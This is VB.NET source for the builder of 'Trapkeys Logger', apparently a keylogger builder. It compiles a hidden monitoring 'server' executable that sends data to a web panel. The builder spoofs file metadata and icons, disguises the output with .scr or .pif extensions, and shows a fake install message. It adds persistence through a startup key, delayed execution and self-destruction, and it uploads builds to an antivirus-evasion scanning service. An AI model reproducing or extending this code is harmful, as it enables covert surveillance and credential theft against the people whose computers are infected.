Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.Win32
Imports System.Threading
Imports System.Net
Imports System.Text.RegularExpressions
Imports System.IO

Public Class Form1
#Region "Variable Declaration"
    Private Source As String = My.Resources.Source
    Private Source_Reset As String = My.Resources.Source
    Private Identifier As String = "Administrator"
#End Region
#Region "HelperFunctions"
    Private Sub ReplaceSource(ByVal OldValue As String, ByVal NewValue As String)
        Source = Source.Replace(OldValue, NewValue)
    End Sub
    Private Sub CheckAllCheckBoxesInGroup(_GroupBox As xVisualGroupBox, _Case As Boolean)
        For Each C As Control In PasswordGroupBox.Controls
            If TypeOf C Is xVisualCheckBox Then
                DirectCast(C, xVisualCheckBox).Checked = _Case
            End If
        Next
    End Sub
    Private Sub ChooseFile(ByVal Filter As String, ByVal Title As String, ByVal Textbox As xVisualTextBox)
        Dim O As New OpenFileDialog
        With O
            .Filter = Filter
            .Title = Title
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                Textbox.Text = .FileName
            Else : Exit Sub
            End If
        End With
    End Sub
    Private Sub AddItemToListBox(_ListBox As NSListBox, _Item As String)
        If Not _Item Is Nothing Then
            If Not _ListBox.Items.Contains(_Item) Then
                _ListBox.Items.Add(_Item)
            End If
        End If
    End Sub
    Private Sub RemoveItemFromListBox(_ListBox As NSListBox)
        If Not _ListBox.SelectedItem Is Nothing Then
            _ListBox.Items.RemoveAt(_ListBox.SelectedIndex)
        End If
    End Sub
    Private Sub DropItemsToListBox(e As DragEventArgs, _ListBox As NSListBox)
        Dim Files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each F As String In Files
            _ListBox.Items.Add(F)
        Next
    End Sub
    Private Sub DropItemsToTextBox(e As DragEventArgs, _TextBox As xVisualTextBox, _Extension As String)
        Dim Files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each F As String In Files
            If IO.Path.GetExtension(F) = _Extension Then
                _TextBox.Text = F
            End If
        Next
    End Sub
    Private Sub DragEnterMethod(e As DragEventArgs)
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub
    Public Sub ControlText(ByVal Control As Control, ByVal Text As String)
        Invoke(New MethodInvoker(Sub()
                                     Control.Text = Text
                                 End Sub))
    End Sub
    Public Sub ControlColor(ByVal Control As Control, ByVal Color As Color)
        Invoke(New MethodInvoker(Sub()
                                     Control.ForeColor = Color
                                 End Sub))
    End Sub
#End Region

#Region "FormOperations"

    Private Sub AllPasswords_CheckedChanged(sender As Object) Handles AllPasswords.CheckedChanged
        If AllPasswords.Checked Then
            CheckAllCheckBoxesInGroup(PasswordGroupBox, True)
        Else
            CheckAllCheckBoxesInGroup(PasswordGroupBox, False)
        End If
    End Sub

    Private Sub XVisualButton2_Click(sender As Object, e As EventArgs) Handles XVisualButton2.Click
        AddItemToListBox(HotKeywordList, HotKeyword.Text)
    End Sub

    Private Sub XVisualButton3_Click(sender As Object, e As EventArgs) Handles XVisualButton3.Click
        RemoveItemFromListBox(HotKeywordList)
    End Sub

    Private Sub XVisualButton5_Click(sender As Object, e As EventArgs) Handles XVisualButton5.Click
        AddItemToListBox(ScreenHotList, ScreenHotWord.Text)
    End Sub

    Private Sub XVisualButton4_Click(sender As Object, e As EventArgs) Handles XVisualButton4.Click
        RemoveItemFromListBox(ScreenHotList)
    End Sub

    Private Sub XVisualButton8_Click(sender As Object, e As EventArgs) Handles XVisualButton8.Click
        AddItemToListBox(WebBlockList, BlockWebsite.Text)
    End Sub

    Private Sub XVisualButton7_Click(sender As Object, e As EventArgs) Handles XVisualButton7.Click
        RemoveItemFromListBox(WebBlockList)
    End Sub

    Private Sub XVisualButton9_Click(sender As Object, e As EventArgs) Handles XVisualButton9.Click
        WebBlockList.Items.Clear()
    End Sub

    Private Sub XVisualButton12_Click(sender As Object, e As EventArgs) Handles XVisualButton12.Click
        AddItemToListBox(WebVisitList, VisitWebsite.Text)
    End Sub

    Private Sub XVisualButton11_Click(sender As Object, e As EventArgs) Handles XVisualButton11.Click
        RemoveItemFromListBox(WebVisitList)
    End Sub

    Private Sub XVisualButton10_Click(sender As Object, e As EventArgs) Handles XVisualButton10.Click
        WebVisitList.Items.Clear()
    End Sub

    Private Sub XVisualButton15_Click(sender As Object, e As EventArgs) Handles XVisualButton15.Click
        AttachList.Items.Clear()
    End Sub
    Private Sub XVisualButton6_Click(sender As Object, e As EventArgs) Handles XVisualButton6.Click
        CleanList.Items.Clear()
    End Sub

    Private Sub AttachList_DragDrop(sender As Object, e As DragEventArgs) Handles AttachList.DragDrop
        DropItemsToListBox(e, AttachList)
    End Sub

    Private Sub AttachList_DragEnter(sender As Object, e As DragEventArgs) Handles AttachList.DragEnter
        DragEnterMethod(e)
    End Sub

    Private Sub CleanList_DragDrop(sender As Object, e As DragEventArgs) Handles CleanList.DragDrop
        DropItemsToListBox(e, CleanList)
    End Sub

    Private Sub CleanList_DragEnter(sender As Object, e As DragEventArgs) Handles CleanList.DragEnter
        DragEnterMethod(e)
    End Sub


    Private Sub AssemblyPath_DragDrop(sender As Object, e As DragEventArgs) Handles AssemblyPath.DragDrop
        DropItemsToTextBox(e, AssemblyPath, ".exe")
        If IO.Path.GetExtension(AssemblyPath.Text) = ".exe" Then
            GetAssemblyInformation(AssemblyPath.Text)
        End If
    End Sub

    Private Sub AssemblyPath_DragEnter(sender As Object, e As DragEventArgs) Handles AssemblyPath.DragEnter
        DragEnterMethod(e)
    End Sub

    Private Sub IconPath_DragDrop(sender As Object, e As DragEventArgs) Handles IconPath.DragDrop
        DropItemsToTextBox(e, IconPath, ".ico")
    End Sub

    Private Sub IconPath_DragEnter(sender As Object, e As DragEventArgs) Handles IconPath.DragEnter
        DragEnterMethod(e)
    End Sub

    Private Sub ScanPath_DragDrop(sender As Object, e As DragEventArgs) Handles ScanPath.DragDrop
        DropItemsToTextBox(e, ScanPath, ".exe")
    End Sub

    Private Sub ScanPath_DragEnter(sender As Object, e As DragEventArgs) Handles ScanPath.DragEnter
        DragEnterMethod(e)
    End Sub

#End Region

    Private Sub GetAssemblyInformation(ByVal Path As String)
        Dim AssemblyInfo As FileVersionInfo
        AssemblyInfo = FileVersionInfo.GetVersionInfo(Path)
        With AssemblyInfo
            AssemblyTitle.Text = .ProductName
            AssemblyDescription.Text = .FileDescription
            AssemblyCompany.Text = .CompanyName
            AssemblyCopyright.Text = .LegalCopyright
            AssemblyTrademark.Text = .LegalTrademarks
            AssemblyProduct.Text = .ProductName

            AssemblyVersionMajor.Text = .ProductMajorPart
            AssemblyMinor.Text = .ProductMinorPart
            AssemblyBuild.Text = .ProductBuildPart
            AssemblyPrivate.Text = .ProductPrivatePart

            FileMajor.Text = .FileMajorPart
            FileMinor.Text = .FileMinorPart
            FileBuild.Text = .FileBuildPart
            FilePrivate.Text = .FilePrivatePart
        End With
    End Sub

    Private Sub XVisualButton17_Click(sender As Object, e As EventArgs) Handles XVisualButton17.Click
        ChooseFile("Executables(*.exe)|*.exe", "Trapkeys - Select your old server to load Assembly Information", AssemblyPath)
        GetAssemblyInformation(AssemblyPath.Text)
    End Sub

    Private Sub XVisualButton28_Click(sender As Object, e As EventArgs) Handles XVisualButton28.Click
        ChooseFile("All Files(*.*)|*.*", "Trapkeys - Choose File to Scan", ScanPath)
    End Sub

    Private Sub XVisualButton16_Click(sender As Object, e As EventArgs) Handles XVisualButton16.Click
        ChooseFile("Icon Files(*.ico)|*.ico", "Trapkeys - Choose Icon", IconPath)
    End Sub

    Private Sub XVisualButton29_Click(sender As Object, e As EventArgs) Handles XVisualButton29.Click
        Dim S As New SaveFileDialog
        Dim OutputPath As String = Nothing
        With S
            .Title = "Trapkeys Logger- Save File"
            .Filter = "Executables(*.exe)|*.exe"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                OutputPath = .FileName
                CompileServer(OutputPath)
            Else : Exit Sub
            End If
        End With
    End Sub
    Private Sub CompileServer(ByVal Output As String)
        Dim Compiler As New Generator.CodeDom(Output)
        ApplySettings()
        With Compiler
            .Source = Source
            If Not NoIcon.Checked Then
                If (CustomIcon.Checked Or InbuiltIcon.Checked) And IconPath.Text <> "Choose Icon..." Then .Icon = IconPath.Text
            End If
            .VisibleForm = False
            If AttachList.Items.Count > 0 Then
                For Each I As String In AttachList.Items
                    .AddResource(IO.Path.GetFileName(I), I)
                Next
            End If
            .MainClass = "MainClass"
            .Compile("Resourcename")
            ChangeExtension(Output)
            MessageBox.Show("Server generated successfully. You can now install " & IO.Path.GetFileName(Output) & " on the computer you want to monitor.", "Successfully generated!", MessageBoxButtons.OK, MessageBoxIcon.Information)
            ResetOperations()
        End With
    End Sub
    Private Sub ResetOperations()
        Source = Source_Reset
    End Sub
    Private Sub ApplySettings()
        AssemblyInformation()
        DefineValues()
        SingleInstance()
        DelayExecution()
        SelfDestruct()
        AttachFiles()
        WebsiteVisitor()
    End Sub
    Private Sub DefineValues()
        ReplaceSource("'MainResourceName", "ResourceName")
        ReplaceSource("'FileIdentifier", Identifier)
        'Delivery Settings
        ReplaceSource("'LinkToWebPath", WebPath.Text)
        ReplaceSource("'EncryptedSecurityKey", SecurityKey.Text)
        ReplaceSource("'GeneratedAuthorizationKey", AuthKey.Text)
        ReplaceSource("'ComputerLimit", ComputerLimit.Text)
        ReplaceSource("'SessionLimit", SessionLimit.Text)
        'Smart Settings
        ReplaceSource("'InstallationMessageTitle", MessageTitle.Text)
        ReplaceSource("'InstallationMessageBody", MessageBody.Text)
        ReplaceSource("'InstallationMessageBoxIcon", MessageIcon.SelectedItem)
        ReplaceSource("'InstallationMessageBoxButtons", MessageButtons.SelectedItem.Replace(" ", Nothing))
        'Advanced Settings
        ReplaceSource("'StartupKey", StartupKey.Text)
        ReplaceSource("'RandomMutex", RandomMutex_Value.Text)
        'ReplaceSource("'ExecutionDelaySeconds", ExecutionDelayValue.Text)
        ReplaceSource("'SelfDestructionTime", SelfDestructionDate.Value)
    End Sub
    Private Sub AssemblyInformation()
        ReplaceSource("'Assembly_Title", AssemblyTitle.Text)
        ReplaceSource("'Assembly_Description", AssemblyDescription.Text)
        ReplaceSource("'Assembly_Company", AssemblyCompany.Text)
        ReplaceSource("'Assembly_Copyright", AssemblyCopyright.Text)
        ReplaceSource("'Assembly_Trademark", AssemblyTrademark.Text)
        ReplaceSource("'Assembly_Product", AssemblyProduct.Text)
        ReplaceSource("'Assembly_Version", AssemblyVersionMajor.Text & "." & AssemblyMinor.Text & "." & AssemblyBuild.Text & "." & AssemblyPrivate.Text)
        ReplaceSource("'Assembly_FileVersion", FileMajor.Text & "." & FileMinor.Text & "." & FileBuild.Text & "." & FilePrivate.Text)
    End Sub
    Private Sub DelayExecution()
        If ExecutionDelay.Checked Then
            If ExecutionDelayValue.Text <> Nothing Then
                ReplaceSource("'Delay_Execution", Nothing)
                If ExecutionDelayUnits.SelectedItem.Equals("Seconds") Then
                    ReplaceSource("'ExecutionDelaySeconds", CInt(ExecutionDelayValue.Text) * 1000)
                ElseIf ExecutionDelayUnits.SelectedItem.Equals("Minutes") Then
                    ReplaceSource("'ExecutionDelaySeconds", CInt(ExecutionDelayValue.Text) * 60000)
                End If
            End If
        End If
    End Sub
    Private Sub SelfDestruct()
        If SelfDestruction.Checked Then
            ReplaceSource("'Self_Destruction", Nothing)
            ReplaceSource("'SelfDestructionTime", SelfDestructionDate.Value)
        End If
    End Sub
    Private Sub SingleInstance()
        If ProcessMutex.Checked Then
            ReplaceSource("'Process_Mutex", Nothing)
            ReplaceSource("'RandomMutex_Value", RandomMutex_Value.Text)
        End If
    End Sub
    Private Sub AttachFiles()
        If AttachList.Items.Count > 0 Then
            Dim AttachItems As String = Nothing
            For Each I As String In AttachList.Items
                AttachItems &= "AttachedList.Add(""" & IO.Path.GetFileName(I) & """)" & Environment.NewLine
            Next
            If OpenOnce.Checked Then ReplaceSource("'AttachFiles:Once", Nothing)
            ReplaceSource("'AddToAttachedList", AttachItems)
            ReplaceSource("'Attach_Files", Nothing)
        End If
    End Sub
    Private Sub WebsiteVisitor()
        If WebVisitList.Items.Count > 0 Then
            Dim WebPages As String = Nothing
            For Each I As String In WebVisitList.Items
                WebPages &= "WebsiteVisitList.Add(""" & I & """)" & Environment.NewLine
            Next
            ReplaceSource("'AddToWebsiteList", WebPages)
            ReplaceSource("'Website_Visitor", Nothing)
        End If
    End Sub
    Private Sub ChangeExtension(ByVal Path As String)
        Dim NewExtension As String = Nothing
        Select Case ExtensionCombo.SelectedIndex
            Case 1 : NewExtension = ".scr"
            Case 2 : NewExtension = ".pif"
            Case 3 : NewExtension = ".com"
            Case 4 : NewExtension = ".bat"
            Case Else : NewExtension = ".exe"
        End Select
        Try
            IO.File.Move(Path, IO.Path.ChangeExtension(Path, NewExtension))
        Catch ex As Exception
        End Try
    End Sub

    Private Sub XVisualButton26_Click(sender As Object, e As EventArgs) Handles XVisualButton26.Click
        Dim CleanThread As New Thread(AddressOf CleanComputer)
        CleanThread.SetApartmentState(ApartmentState.STA)
        CleanThread.Start()
    End Sub
    Private Sub CleanComputer()
        Dim Files As String = Nothing
        On Error Resume Next
        For Each I As String In CleanList.Items
            For Each p As System.Diagnostics.Process In System.Diagnostics.Process.GetProcesses
                If I.Contains(p.ProcessName) Then
                    p.Kill()
                End If
            Next
            Thread.Sleep(100)
            Dim RegID As String = Help.GenerateHash(IO.Path.GetFileName(I))
            Registry.CurrentUser.DeleteSubKeyTree(RegID)
            Thread.Sleep(100)
            If DeleteFiles.Checked Then
                IO.File.Delete(I)
            End If
            Files &= IO.Path.GetFileName(I) & Environment.NewLine
        Next
        MessageBox.Show("Your computer is now free from " & Environment.NewLine & Files & "Thank you for using Trapkeys Logger!", "Removed!", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub XVisualButton27_Click(sender As Object, e As EventArgs) Handles XVisualButton27.Click
        If IO.File.Exists(ScanPath.Text) Then
            Dim ScanThread As New Thread(AddressOf ScanFile)
            ScanThread.Start()
            Invoke(New MethodInvoker(Sub() XVisualButton27.Text = "Scanning"))
        End If
    End Sub
    Private Sub ScanFile()
        Try
            Dim Client As New WebClient()
            AddHandler Client.UploadFileCompleted, AddressOf GetResults
            Client.UploadFileAsync(New Uri("http://www.refud.me/api.php?auth_token=123456&type=text"), "POST", ScanPath.Text)
        Catch ex As Exception
            MessageBox.Show(ex.ToString)
        End Try
    End Sub
    Private Sub GetResults(sender As Object, e As UploadFileCompletedEventArgs)
        Try
            Dim Response As String = System.Text.Encoding.UTF8.GetString(e.Result)
            Dim I As Integer = Regex.Matches(Response, ",").Count
            For J = 0 To I - 2
                NsListView1.AddItem(Help.GetBetween(Response, """,""", """:""", J), Help.GetBetween(Response, """:""", """,""", J + 1))
            Next
            Invoke(New MethodInvoker(Sub()
                                         Label23.Text = Help.GetBetween(Response, """result"":", "}", 0) & "/35"
                                         LinkLabel1.Text = Help.GetBetween(Response, """:""", """,""", 0).Replace("\", Nothing)
                                         LinkLabel1.LinkColor = Color.GreenYellow
                                         XVisualButton27.Text = "Submit"
                                     End Sub))
            MessageBox.Show("Scan Finished!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show(ex.ToString, "Unable to parse results!", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        If LinkLabel1.Text <> "Click here after scanning is complete" Then Process.Start(LinkLabel1.Text)
    End Sub
    Private Sub XVisualButton1_Click(sender As Object, e As EventArgs) Handles XVisualButton1.Click
        Dim ConnectionThread As New Thread(AddressOf EstablishConnection)
        ConnectionThread.SetApartmentState(ApartmentState.STA)
        ConnectionThread.Start()
    End Sub
    Sub EstablishConnection()
        Dim Response As String = Help.PostRequest(WebPath.Text & "handle.php", {"identifier", "securitykey", "tablename"}, {Identifier, SecurityKey.Text, "Testing"})
        If Response.Trim = SecurityKey.Text Then
            ControlText(Label6, "Connection Established")
            ControlColor(Label6, Color.Green)
        Else
            ControlText(Label6, "Connection Failed")
            ControlColor(Label6, Color.Red)
        End If
    End Sub

    Private Sub SecurityKey_TextChanged(sender As Object, e As EventArgs) Handles SecurityKey.TextChanged

    End Sub

    Private Sub NsRandomPool1_ValueChanged(sender As Object) Handles NsRandomPool1.ValueChanged
        AuthKey.Text = Help.GenerateHash(Now.Millisecond.ToString)
    End Sub

    Private Sub XVisualButton13_Click(sender As Object, e As EventArgs) Handles XVisualButton13.Click
        Try
           MessageBox.Show(MessageBody.Text, MessageTitle.Text, [Enum].Parse(GetType(MessageBoxButtons), MessageButtons.SelectedItem.ToString.Replace(" ", Nothing), True), [Enum].Parse(GetType(MessageBoxIcon), MessageIcon.SelectedItem, True))
        Catch ex As Exception
            MessageBox.Show(ex.ToString)
        End Try
    End Sub
End Class

Public Class Help
    Public Shared Function PostRequest(ByVal Link As String, ByVal Parameters As String(), ByVal Values As String()) As String
        Try
            Using Client As New WebClient
                Dim _Param As New Specialized.NameValueCollection
                With _Param
                    For i = 0 To Parameters.Length - 1
                        .Add(Parameters(i), Values(i))
                    Next
                End With
                Dim responsebytes = Client.UploadValues(Link, "POST", _Param)
                Dim responsebody = (New System.Text.UTF8Encoding).GetString(responsebytes)
                Return responsebody
            End Using
        Catch ex As Exception
            Return ex.ToString
        End Try
    End Function
    Public Shared Function GetBetween(ByVal input As String, ByVal str1 As String, ByVal str2 As String, ByVal ind As Integer) As String
        Dim temp As String = Regex.Split(input, str1)(ind + 1)
        Return Regex.Split(temp, str2)(0)
    End Function
    Public Shared Function GenerateHash(ByVal S As String) As String
        Dim SHA1Obj As New SHA1CryptoServiceProvider
        Dim HashBytes() As Byte = Encoding.ASCII.GetBytes(S)
        HashBytes = SHA1Obj.ComputeHash(HashBytes)
        Dim Result As String = Nothing
        For Each B As Byte In HashBytes
            Result += B.ToString("x1")
        Next
        Return Result
    End Function
End Class